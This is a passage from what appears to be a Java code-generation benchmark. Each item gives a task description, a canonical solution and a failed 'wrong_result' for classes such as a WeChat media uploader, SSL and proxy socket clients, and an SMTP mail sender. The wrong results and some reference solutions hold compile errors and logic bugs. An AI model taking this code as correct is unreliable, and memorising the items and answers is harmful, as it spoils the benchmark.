    "Canonical_solution": "import cn.hutool.json.JSONObject;\nimport cn.lili.common.enums.ClientTypeEnum;\nimport cn.lili.common.enums.ResultCode;\nimport cn.lili.common.exception.ServiceException;\nimport cn.lili.modules.wechat.util.WechatAccessTokenUtil;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@Slf4j\n@Component\npublic class WechatMediaUtil {\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.cgiAccessToken(ClientTypeEnum.WECHAT_MP);\n        String MEDIA_URL = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token=ACCESS_TOKEN&type=TYPE\";\n\n        StringBuffer resultStr = null;\n        String mediaStr = MEDIA_URL.replace(\"ACCESS_TOKEN\", accessToken).replace(\"TYPE\", type);\n        URL mediaUrl;\n        try {\n            String boundary = \"----WebKitFormBoundaryOYXo8heIv9pgpGjT\";\n            URL url = new URL(mediaStr);\n            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();\n            urlConn.setDoInput(true);\n            urlConn.setDoOutput(true);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n            urlConn.setRequestMethod(\"POST\");\n            OutputStream out = urlConn.getOutputStream();\n\n            mediaUrl = new URL(mediaFileUrl);\n            HttpURLConnection mediaConn = (HttpURLConnection) mediaUrl.openConnection();\n            mediaConn.setRequestMethod(\"GET\");\n            mediaConn.setDoInput(true);\n            String contentType = mediaConn.getHeaderField(\"Content-Type\");\n            String fileExt = judgeType(contentType);\n            InputStream in = mediaConn.getInputStream();\n            BufferedInputStream bufferedIn = new BufferedInputStream(in);\n            byte[] bytes = new byte[1024];\n            int size = 0;\n            out.write((\"--\" + boundary + \"\\r\\n\").getBytes());\n            out.write((\"Content-Disposition: form-data; name=\\\"media\\\";\\r\\n\"\n                    + \"filename=\\\"\" + (System.currentTimeMillis()) + fileExt + \"\\\"\\r\\n\"\n                    + \"Content-Type: \" + contentType + \"\\r\\n\\r\\n\").getBytes());\n            while ((size = bufferedIn.read(bytes)) != -1) {\n                out.write(bytes, 0, size);\n            }\n            out.write((\"\\r\\n--\" + boundary + \"--\\r\\n\").getBytes());\n\n            bufferedIn.close();\n            in.close();\n            mediaConn.disconnect();\n\n            InputStream resultIn = urlConn.getInputStream();\n            InputStreamReader reader = new InputStreamReader(resultIn);\n            BufferedReader bufferedReader = new BufferedReader(reader);\n            String tempStr = null;\n            resultStr = new StringBuffer();\n            while ((tempStr = bufferedReader.readLine()) != null) {\n                resultStr.append(tempStr);\n            }\n            bufferedReader.close();\n            reader.close();\n            resultIn.close();\n            urlConn.disconnect();\n        } catch (Exception e) {\n            log.error(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20\u5931\u8d25\", e);\n        }\n        assert resultStr != null;\n        JSONObject jsonObject = new JSONObject(resultStr.toString());\n        log.info(\"\u5fae\u4fe1\u5a92\u4f53\u4e0a\u4f20:\" + jsonObject);\n        if (jsonObject.get(\"errcode\") != null && (\"40001\").equals(jsonObject.get(\"errcode\"))) {\n            wechatAccessTokenUtil.removeAccessToken(ClientTypeEnum.WECHAT_MP);\n            return this.uploadMedia(type, mediaFileUrl);\n        } else if (jsonObject.get(\"errcode\") != null) {\n            throw new ServiceException(jsonObject.get(\"errmsg\").toString());\n        } else {\n            return jsonObject.get(\"media_id\").toString();\n        }\n    }\n\n    public String judgeType(String contentType) {\n        String fileExt = \"\";\n        switch (contentType) {\n            case \"image/png\":\n                fileExt = \".png\";\n                break;\n            case \"image/jpeg\":\n                fileExt = \".jpeg\";\n                break;\n            case \"image/jpg\":\n                fileExt = \".jpg\";\n                break;\n            default:\n                throw new ServiceException(ResultCode.IMAGE_FILE_EXT_ERROR);\n        }\n        return fileExt;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport org.springframework.http.*;\nimport org.springframework.util.MultiValueMap;\nimport org.springframework.web.client.RestTemplate;\nimport org.springframework.web.multipart.MultipartFile;\nimport org.springframework.core.io.FileSystemResource;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\n@Component\npublic class WechatMediaUtil {\n\n    @Autowired\n    private WechatAccessTokenUtil wechatAccessTokenUtil;\n\n    private static final String MEDIA_URL_TEMPLATE = \"https://api.weixin.qq.com/cgi-bin/media/upload?access_token={ACCESS_TOKEN}&type={TYPE}\";\n\n    private static final Map<String, String> CONTENT_TYPE_TO_EXTENSION = new HashMap<>();\n    static {\n        CONTENT_TYPE_TO_EXTENSION.put(\"image/jpeg\", \".jpg\");\n        CONTENT_TYPE_TO_EXTENSION.put(\"image/png\", \".png\");\n        CONTENT_TYPE_TO_EXTENSION.put(\"video/mp4\", \".mp4\");\n        CONTENT_TYPE_TO_EXTENSION.put(\"audio/mpeg\", \".mp3\");\n        CONTENT_TYPE_TO_EXTENSION.put(\"application/octet-stream\", \".bin\");\n    }\n\n    public String uploadMedia(String type, String mediaFileUrl) {\n        String accessToken = wechatAccessTokenUtil.getAccessToken();\n        if (accessToken == null || accessToken.isEmpty()) {\n            accessToken = wechatAccessTokenUtil.refreshAccessToken();\n        }\n\n        String mediaUrl = MEDIA_URL_TEMPLATE.replace(\"{ACCESS_TOKEN}\", accessToken).replace(\"{TYPE}\", type);\n\n        try {\n            Path filePath = Path.of(mediaFileUrl);\n            String contentType = Files.probeContentType(filePath);\n            if (contentType == null || contentType.isEmpty()) {\n                throw new IllegalArgumentException(\"Unable to determine content type for file: \" + mediaFileUrl);\n            }\n\n            String fileExtension = judgeType(contentType);\n            File file = filePath.toFile();\n\n            HttpHeaders headers = new HttpHeaders();\n            headers.setContentType(MediaType.MULTIPART_FORM_DATA);\n\n            MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();\n            body.add(\"media\", new FileSystemResource(file));\n\n            HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);\n\n            ResponseEntity<String> response = new RestTemplate().postForEntity(mediaUrl, requestEntity, String.class);\n            return parseMediaId(response.getBody());\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error uploading media file: \" + e.getMessage(), e);\n        }\n    }\n\n    private String judgeType(String contentType) {\n        String extension = CONTENT_TYPE_TO_EXTENSION.get(contentType);\n        if (extension == null) {\n            throw new IllegalArgumentException(\"Unsupported content type: \" + contentType);\n        }\n        return extension;\n    }\n\n    private String parseMediaId(String response) {\n        int startIndex = response.indexOf(\"\\\"media_id\\\":\");\n        if (startIndex == -1) {\n            throw new IllegalArgumentException(\"Invalid response format: \" + response);\n        }\n        startIndex += \"\\\"media_id\\\":\".length();\n        int endIndex = response.indexOf(\",\", startIndex);\n        if (endIndex == -1) {\n            endIndex = response.length();\n        }\n        return response.substring(startIndex, endIndex).trim();\n    }\n}"
  },
  {
    "Task_id": 560,
    "Instruction": "Task Description: Create a Java class that implements a secure socket client using SSL/TLS to communicate with a server. The client should be able to send HTTP requests and read responses.\n\nClass Description: The SocketClient class establishes a secure connection to a server using SSL/TLS, sends an HTTP GET request, and reads the response. It handles socket creation, SSL handshake, request sending, and response parsing.\n\nAttributes:\n- clientSslContext: [SSLContext] - The SSL context used for creating secure sockets\n- address: [InetSocketAddress] - The server address (host and port) to connect to\n\nMethods:\n- Constructor: [SocketClient]([SSLContext clientSslContext, InetSocketAddress address]) -> [void] - Initializes the client with SSL context and server address\n- doRequest: [doRequest]() -> [void] - Establishes connection, sends HTTP request, reads response, and closes connection (throws IOException)\n- readLine: [readLine]([InputStream is]) -> [String] - Helper method to read a line from input stream (throws IOException)\n- readResponse: [readResponse]([SSLSocket sslSocket]) -> [void] - Reads and processes the HTTP response headers and body (throws IOException)",
    "Canonical_solution": "import io.undertow.Undertow;\nimport io.undertow.util.Headers;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\n\npublic class SocketClient {\n\n    private SSLContext clientSslContext;\n    private InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        Socket rawSocket = new Socket();\n        rawSocket.connect(address);\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory()\n            .createSocket(rawSocket, \"localhost\", address.getPort(), false);\n        PrintWriter writer = new PrintWriter(sslSocket.getOutputStream());\n        writer.println(\"GET / HTTP/1.1\");\n        writer.println(\"Host: localhost\");\n        writer.println(\"Connection: keep-alive\");\n        writer.println();\n        writer.flush();\n        readResponse(sslSocket);\n\n        sslSocket.shutdownOutput();\n        rawSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder line = new StringBuilder();\n        while (true) {\n            int c = is.read();\n            switch (c) {\n                case -1:\n                    throw new RuntimeException(\"Unexpected EOF\");\n                case '\\r':\n                    continue;\n                case '\\n':\n                    return line.toString();\n                default:\n                    line.append((char) c);\n            }\n        }\n    }\n\n    private void readResponse(SSLSocket sslSocket) throws IOException {\n        String line;\n        int contentLength = 0;\n        Pattern CONTENT_LENGTH_PATTERN = Pattern.compile(\"Content-Length: ([0-9]+)\", Pattern.CASE_INSENSITIVE);\n\n        do {\n            line = readLine(sslSocket.getInputStream());\n            Matcher matcher = CONTENT_LENGTH_PATTERN.matcher(line);\n            if (matcher.matches()) {\n                contentLength = Integer.parseInt(matcher.group(1), 10);\n            }\n        } while (!line.isEmpty());\n\n        for (int i = 0; i < contentLength; i++) {\n            sslSocket.getInputStream().read();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport java.net.InetSocketAddress;\nimport java.io.InputStream;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\n\npublic class SocketClient {\n    private final SSLContext clientSslContext;\n    private final InetSocketAddress address;\n\n    public SocketClient(SSLContext clientSslContext, InetSocketAddress address) {\n        this.clientSslContext = clientSslContext;\n        this.address = address;\n    }\n\n    public void doRequest() throws IOException {\n        SSLSocket sslSocket = (SSLSocket) clientSslContext.getSocketFactory().createSocket();\n        sslSocket.connect(address);\n        String request = \"GET / HTTP/1.1\\r\\nHost: \" + address.getHostString() + \"\\r\\n\\r\\n\";\n        try (OutputStream os = sslSocket.getOutputStream()) {\n            os.write(request.getBytes(StandardCharsets.UTF_8));\n            os.flush();\n        }\n        readResponse(sslSocket);\n        sslSocket.close();\n    }\n\n    private String readLine(InputStream is) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = is.read()) != -1) {\n            if (c == '\\n') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    public void readResponse(SSLSocket sslSocket) throws IOException {\n        InputStream is = sslSocket.getInputStream();\n        String line = readLine(is);\n        while ((line = readLine(is)) != null && !line.isEmpty()) {\n            // Process headers\n        }\n        while ((line = readLine(is)) != null) {\n            // Process body\n        }\n    }\n}"
  },
  {
    "Task_id": 561,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client capable of connecting to servers directly or through HTTP proxies, with support for SSL/TLS connections.\n\nClass Description: RouterSocketClient is a networking class that handles socket connections to remote servers, supporting both direct connections and HTTP proxy connections. It includes SSL/TLS capabilities and handles various connection scenarios with appropriate timeouts.\n\nAttributes:\n- TAG: [String] - Class tag for logging purposes\n- SERVER_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for server connections (20 seconds)\n- HTTP_PROXY_CONNECT_TIMEOUT_MILLIS: [int] - Timeout for HTTP proxy connections (5 seconds)\n- TLS_HANDSHAKE_TIMEOUT_MILLIS: [int] - Timeout for TLS handshake (20 seconds)\n- mLock: [Object] - Synchronization lock object\n- mConnectivityManager: [ConnectivityManager] - Android network connectivity manager\n- mSSLSocketFactory: [SSLSocketFactory] - SSL socket factory for secure connections\n- mContext: [Context] - Android application context\n- mDelayedRestartHandler: [Handler] - Handler for delayed operations\n- mSocket: [Socket] - Current active socket connection\n- mThread: [Thread] - Thread handling socket operations\n\nMethods:\n- RouterSocketClient(Context, ConnectivityManager, Random) -> [Constructor] - Initializes the client with context, connectivity manager, and random number generator\n- connectSocket(String host, int port) -> [Socket] - Static method that establishes a socket connection to the specified host:port, handling both direct and proxy connections\n- connectSocketNoProxy(String host, int port) -> [Socket] - Static helper method for direct socket connections without proxy\n- connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) -> [Socket] - Static helper method for establishing connections through HTTP proxies using CONNECT method\n- tryEnableSni(SSLSocket socket, String hostname) -> [void] - Attempts to enable Server Name Indication (SNI) on the SSL socket\n- tryEnableSessionTickets(SSLSocket socket) -> [void] - Attempts to enable session tickets on the SSL socket",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.os.Handler;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.lang.reflect.InvocationTargetException;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.security.cert.X509Certificate;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.concurrent.CopyOnWriteArrayList;\n\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class RouterSocketClient {\n\n    private static final String TAG = RouterSocketClient.class.getSimpleName();\n    private static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    private static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    private static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(\n            Context context,\n            ConnectivityManager connectivityManager,\n            Random rng) {\n        mContext = context;\n        mDelayedRestartHandler = new Handler(mContext.getMainLooper());\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n    }\n\n    private static Socket connectSocket(String host, int port) throws IOException {\n        URI serverUri = URI.create(\"https://\" + host + \":\" + port);\n        ProxySelector proxySelector = ProxySelector.getDefault();\n        List<Proxy> proxies = proxySelector.select(serverUri);\n        if ((proxies == null) || (proxies.isEmpty())) {\n            proxies = Collections.singletonList(Proxy.NO_PROXY);\n        }\n\n        IOException lastFailure = null;\n        for (Proxy proxy : proxies) {\n            SocketAddress proxyAddress = proxy.address();\n            try {\n                if (Proxy.NO_PROXY.equals(proxy)) {\n                    return connectSocketNoProxy(host, port);\n                } else if (proxy.type() == Proxy.Type.HTTP) {\n                    return connectSocketViaHttpProxyConnectMethod(host, port, proxyAddress);\n                }\n            } catch (IOException e) {\n                lastFailure = e;\n                if (proxyAddress != null) {\n                    proxySelector.connectFailed(serverUri, proxyAddress, e);\n                }\n            }\n        }\n\n        if (lastFailure != null) {\n            throw lastFailure;\n        }\n        throw new IOException(\"No suitable connection methods found for \" + serverUri + \": \" + proxies);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" directly\");\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            SocketAddress address = new InetSocketAddress(host, port);\n            socket = new Socket();\n            socket.connect(address, SERVER_CONNECT_TIMEOUT_MILLIS);\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(\n            String host, int port, SocketAddress proxyAddress) throws IOException {\n        Log.d(TAG, \"Connecting to \" + host + \":\" + port + \" via HTTP proxy \" + proxyAddress);\n        Socket socket = new Socket();\n        boolean success = false;\n        try {\n            InetSocketAddress proxyInetAddress = (InetSocketAddress) proxyAddress;\n            if (proxyInetAddress.isUnresolved()) {\n                proxyInetAddress = new InetSocketAddress(\n                        proxyInetAddress.getHostName(),\n                        proxyInetAddress.getPort());\n            }\n            socket = new Socket();\n            socket.connect(proxyInetAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(\n                    socket.getOutputStream(), \"US-ASCII\"));\n            out.write(\"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\");\n            out.write(\"Host: \" + host + \":\" + port + \"\\r\\n\");\n            out.write(\"\\r\\n\");\n            out.flush();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream(), \"US-ASCII\"));\n            String line;\n            boolean statusLineRead = false;\n            boolean responseHeadersRead = false;\n            socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n            while ((line = in.readLine()) != null) {\n                if (!statusLineRead) {\n                    String[] tokens = line.split(\"\\\\s+\", 3);\n                    if (tokens.length != 3) {\n                        throw new IOException(\"Unexpected reply from HTTP proxy: \" + line);\n                    }\n                    String httpVersion = tokens[0];\n                    String statusCodeString = tokens[1];\n                    String reason = tokens[2];\n                    if (!httpVersion.startsWith(\"HTTP/1.\")) {\n                        throw new IOException(\"Unsupported HTTP version in HTTP proxy response: \" + line);\n                    }\n                    if (!\"200\".equals(statusCodeString)) {\n                        throw new IOException(\n                                \"HTTP proxy CONNECT failed. Status: \" + statusCodeString + \", reason: \" + reason);\n                    }\n                    statusLineRead = true;\n                    continue;\n                }\n                if (line.length() == 0) {\n                    responseHeadersRead = true;\n                    break;\n                }\n            }\n\n            if (!statusLineRead) {\n                throw new EOFException(\"Empty response from HTTP proxy\");\n            }\n            if (!responseHeadersRead) {\n                throw new EOFException(\"Premature end of stream while reading HTTP proxy response\");\n            }\n\n            success = true;\n            return socket;\n        } finally {\n            if (!success) {\n                socket.close();\n            }\n        }\n    }\n\n    private static void tryEnableSni(SSLSocket socket, String hostname) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setHostname\", String.class).invoke(socket, hostname);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable SNI via Reflection API\", e);\n        }\n    }\n\n    private static void tryEnableSessionTickets(SSLSocket socket) throws IOException {\n        try {\n            socket.getClass().getMethod(\"setUseSessionTickets\", boolean.class).invoke(socket, true);\n        } catch (NoSuchMethodException | IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            throw new IOException(\"Failed to enable session tickets via Reflection API\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class RouterSocketClient {\n    public static final String TAG = \"RouterSocketClient\";\n    public static final int SERVER_CONNECT_TIMEOUT_MILLIS = 20000;\n    public static final int HTTP_PROXY_CONNECT_TIMEOUT_MILLIS = 5000;\n    public static final int TLS_HANDSHAKE_TIMEOUT_MILLIS = 20000;\n    private final Object mLock = new Object();\n    private final ConnectivityManager mConnectivityManager;\n    private final SSLSocketFactory mSSLSocketFactory;\n    private final Context mContext;\n    private final Handler mDelayedRestartHandler;\n    private Socket mSocket;\n    private Thread mThread;\n\n    public RouterSocketClient(Context context, ConnectivityManager connectivityManager, Random random) {\n        mContext = context;\n        mConnectivityManager = connectivityManager;\n        mSSLSocketFactory = createSSLSocketFactory();\n        mDelayedRestartHandler = new Handler(Looper.getMainLooper());\n    }\n\n    public static Socket connectSocket(String host, int port) throws IOException {\n        Socket socket = connectSocketNoProxy(host, port);\n        if (socket == null) {\n            Proxy proxy = getProxy();\n            if (proxy != null) {\n                socket = connectSocketViaHttpProxyConnectMethod(host, port, proxy.address());\n            }\n        }\n        return socket;\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n        if (mSSLSocketFactory != null) {\n            SSLSocket sslSocket = (SSLSocket) mSSLSocketFactory.createSocket(socket, host, port, true);\n            tryEnableSni(sslSocket, host);\n            tryEnableSessionTickets(sslSocket);\n            return sslSocket;\n        }\n        return socket;\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) throws IOException {\n        Socket proxySocket = new Socket();\n        proxySocket.connect(proxyAddress, HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n        OutputStream out = proxySocket.getOutputStream();\n        String request = \"CONNECT \" + host + \":\" + port + \" HTTP/1.1\\r\\n\" +\n                         \"Host: \" + host + \"\\r\\n\" +\n                         \"User-Agent: RouterSocketClient\\r\\n\" +\n                         \"\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(proxySocket.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            if (line.trim().equals(\"HTTP/1.1 200 OK\")) {\n                break;\n            }\n        }\n        if (mSSLSocketFactory != null) {\n            SSLSocket sslSocket = (SSLSocket) mSSLSocketFactory.createSocket(proxySocket, host, port, true);\n            tryEnableSni(sslSocket, host);\n            tryEnableSessionTickets(sslSocket);\n            return sslSocket;\n        }\n        return proxySocket;\n    }\n\n    private static void tryEnableSni(SSLSocket socket, String hostname) {\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {\n            socket.setHostname(hostname);\n        }\n    }\n\n    private static void tryEnableSessionTickets(SSLSocket socket) {\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {\n            socket.setEnabledProtocols(new String[] {\"TLSv1.2\"});\n            socket.setEnabledCipherSuites(socket.getEnabledCipherSuites());\n            socket.setUseSessionTickets(true);\n        }\n    }\n\n    private static Proxy getProxy() {\n        return Proxy.NO_PROXY;\n    }\n\n    private SSLSocketFactory createSSLSocketFactory() {\n        return SSLContext.getDefault().getSocketFactory();\n    }\n}"
  },
  {
    "Task_id": 562,
    "Instruction": "Task Description: Implement a Java class that handles sending emails with attachments via SMTP protocol using socket programming.\n\nClass Description: The SendMailJob class provides functionality to connect to an SMTP server, compose and send emails with attachments, and properly handle the email sending process including connection management and error handling.\n\nAttributes:\n- socket: [Socket] - The socket connection to the SMTP server\n- in: [BufferedReader] - Input stream for reading server responses\n- out: [OutputStream] - Output stream for sending commands to the server\n- out64: [Base64OutputStream] - Base64 encoded output stream for sending attachments\n- connectedToMailServer: [boolean] - Flag indicating connection status\n- mailServer: [String] - SMTP server address\n- fromAddress: [String] - Sender's email address\n- boundary: [String] - MIME boundary for multipart messages\n- recipientString: [String] - Comma-separated recipient addresses\n- mailSubject: [String] - Email subject line\n- mailBody: [String] - Email body content\n- errorDialogTitle: [String] - Title for error dialogs\n\nMethods:\n- SendMailJob([ProgressDialog, MainFrame, FileSet, String, String, String]) -> [void] - Constructor that initializes email parameters and configurations\n- openConnection() -> [void] - Establishes connection with SMTP server and initializes streams\n- sendBody() -> [void] - Sends email headers and body content to the server\n- sendAttachment([AbstractFile]) -> [void] - Encodes and sends file attachments to the server\n- closeConnection() -> [void] - Closes all connections and releases resources\n- readWriteLine([String]) -> [void] - Sends a command to server and reads response\n- writeLine([String]) -> [void] - Writes a line to the output stream\n- splitRecipientString([String, List<String>]) -> [String] - Parses recipient string into individual addresses",
    "Canonical_solution": "import com.mucommander.commons.file.AbstractFile;\nimport com.mucommander.commons.io.StreamUtils;\nimport com.mucommander.commons.io.base64.Base64OutputStream;\nimport com.mucommander.conf.MuConfigurations;\nimport com.mucommander.conf.MuPreference;\nimport com.mucommander.conf.MuPreferences;\nimport com.mucommander.job.FileJobState;\nimport com.mucommander.text.Translator;\nimport com.mucommander.ui.dialog.DialogAction;\nimport com.mucommander.ui.dialog.file.ProgressDialog;\nimport com.mucommander.ui.main.MainFrame;\n\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.StringTokenizer;\nimport java.util.Vector;\n\npublic class SendMailJob {\n\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet filesToSend, String recipientString, String mailSubject, String mailBody) {\n        this.boundary = \"mucommander\" + System.currentTimeMillis();\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody + \"\\n\\n\" + \"Sent by muCommander - http://www.mucommander.com\\n\";\n        this.mailServer = MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_SERVER);\n        this.fromAddress = MuConfigurations.getPreferences().getVariable(MuPreference.MAIL_SENDER_ADDRESS);\n        this.errorDialogTitle = Translator.get(\"email_dialog.error_title\");\n    }\n\n    private void openConnection() throws IOException {\n        this.socket = new Socket(mailServer, MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_PORT, MuPreferences.DEFAULT_SMTP_PORT));\n        this.in = new BufferedReader(new InputStreamReader(socket.getInputStream(), \"UTF-8\"));\n        this.out = socket.getOutputStream();\n        this.out64 = new Base64OutputStream(out, true);\n        this.connectedToMailServer = true;\n    }\n\n    private void sendBody() throws IOException {\n        readWriteLine(\"HELO muCommander\");\n        readWriteLine(\"MAIL FROM: \" + fromAddress);\n\n        List<String> recipients = new Vector<String>();\n        recipientString = splitRecipientString(recipientString, recipients);\n        int nbRecipients = recipients.size();\n        for (int i = 0; i < nbRecipients; i++)\n            readWriteLine(\"RCPT TO: <\" + recipients.get(i) + \">\");\n        readWriteLine(\"DATA\");\n        writeLine(\"MIME-Version: 1.0\");\n        writeLine(\"Subject: \" + this.mailSubject);\n        writeLine(\"From: \" + this.fromName + \" <\" + this.fromAddress + \">\");\n        writeLine(\"To: \" + recipientString);\n        writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n        writeLine(\"\\r\\n--\" + boundary);\n        writeLine(\"Content-Type: text/plain; charset=\\\"utf-8\\\"\\r\\n\");\n        writeLine(this.mailBody + \"\\r\\n\\r\\n\");\n        writeLine(\"\\r\\n--\" + boundary);\n    }\n\n    private void sendAttachment(AbstractFile file) throws IOException {\n        InputStream fileIn = null;\n        try {\n            String mimeType = MimeTypes.getMimeType(file);\n            if (mimeType == null)\n                mimeType = \"application/octet-stream\";\n            writeLine(\"Content-Type:\" + mimeType + \"; name=\" + file.getName());\n            writeLine(\"Content-Disposition: attachment;filename=\\\"\" + file.getName() + \"\\\"\");\n            writeLine(\"Content-transfer-encoding: base64\\r\\n\");\n            fileIn = setCurrentInputStream(file.getInputStream());\n            StreamUtils.copyStream(fileIn, out64);\n            out64.writePadding();\n            writeLine(\"\\r\\n--\" + boundary);\n        } finally {\n            if (fileIn != null)\n                fileIn.close();\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            socket.close();\n            in.close();\n            out64.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private void readWriteLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n        in.readLine();\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n    }\n\n    private String splitRecipientString(String recipientsStr, List<String> recipients) {\n        StringBuilder newRecipientsSb = new StringBuilder();\n        StringTokenizer st = new StringTokenizer(recipientsStr, \",;\");\n        String rec;\n        int pos1, pos2;\n        while (st.hasMoreTokens()) {\n            rec = st.nextToken().trim();\n            if ((pos1 = rec.indexOf('<')) != -1 && (pos2 = rec.indexOf('>', pos1 + 1)) != -1)\n                recipients.add(rec.substring(pos1 + 1, pos2));\n            else\n                recipients.add(rec);\n\n            newRecipientsSb.append(rec);\n            if (st.hasMoreTokens())\n                newRecipientsSb.append(\", \");\n        }\n        return newRecipientsSb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class SendMailJob {\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n    private ProgressDialog progressDialog;\n    private MainFrame mainFrame;\n    private FileSet fileSet;\n    private List<String> recipients = new ArrayList<>();\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet fileSet, String mailServer, String fromAddress, String recipientString, String mailSubject, String mailBody, String errorDialogTitle) {\n        this.progressDialog = progressDialog;\n        this.mainFrame = mainFrame;\n        this.fileSet = fileSet;\n        this.mailServer = mailServer;\n        this.fromAddress = fromAddress;\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody;\n        this.errorDialogTitle 